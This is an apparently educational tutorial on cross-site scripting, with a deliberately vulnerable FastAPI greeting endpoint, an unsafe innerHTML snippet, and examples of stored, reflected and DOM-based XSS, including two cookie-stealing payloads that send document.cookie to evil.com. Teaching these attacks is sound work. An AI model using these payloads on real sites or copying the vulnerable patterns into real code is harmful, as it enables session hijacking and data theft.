1️⃣ What is XSS (Cross-Site Scripting)?

Cross-Site Scripting (XSS) is a security vulnerability where attackers inject malicious scripts (JavaScript, HTML, or other code) into web applications. This script then runs in a victim's browser, stealing data, modifying pages, or performing actions on behalf of the user.

📌 Key Attack Flow:

    Attacker injects JavaScript into a web application.

    Browser executes the script thinking it's part of the website.

    User's data (cookies, session tokens, etc.) is stolen or actions are performed without consent.

2️⃣ Example: How an XSS Attack Works

Let's assume a website echoes user input without sanitization.
🔴 Vulnerable Code (FastAPI Example)

A simple FastAPI app that takes a username from the query parameters and displays it:

from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/greet", response_class=HTMLResponse)
async def greet_user(name: str):
    return f"<h1>Hello, {name}!</h1>"  # ❌ XSS Vulnerability (User input is not sanitized)

✅ If a user visits:

http://example.com/greet?name=John

🔹 The output is:

<h1>Hello, John!</h1>

🚨 Attack Scenario:
An attacker can craft a URL like this:

http://example.com/greet?name=<script>alert('Hacked!')</script>

🔹 This gets executed in the victim's browser:

<h1>Hello, <script>alert('Hacked!')</script>!</h1>

🔹 This pops up an alert message, proving the script was injected.
3️⃣ Types of XSS Attacks

XSS attacks can be classified into three main types:
🔹 1. Stored XSS (Persistent)

    The malicious script is permanently stored in the database.

    Every time a user visits the page, the script is executed automatically.

    Common in comment sections, user profiles, and message boards.

📌 Example:
If a user posts a comment:

<script>fetch('https://evil.com?cookie=' + document.cookie)</script>

    This script is stored in the database.

    Whenever another user views the comment, the script runs and sends their cookies to the attacker.

🔹 2. Reflected XSS (Non-Persistent)

    The attack is injected via a request (URL, form, or search bar).

    The script is not stored but immediately reflected in the response.

    This is often exploited through phishing links.

📌 Example:
An attacker sends this link:

http://example.com/search?q=<script>document.location='https://evil.com?cookie='+document.cookie</script>

    If the search page does not sanitize input, this executes JavaScript and steals the user's session.

🔹 3. DOM-Based XSS

    The attack happens entirely in the browser (client-side).

    JavaScript dynamically updates the page without proper sanitization.

    No need for server interaction.

📌 Example:
A script modifies the DOM like this:

var userInput = location.hash.substr(1);
document.getElementById("output").innerHTML = userInput; // ❌ Unsafe

If a user visits:

http://example.com/#<script>alert('Hacked!')</script>

    The script executes, allowing the attacker to manipulate the page.

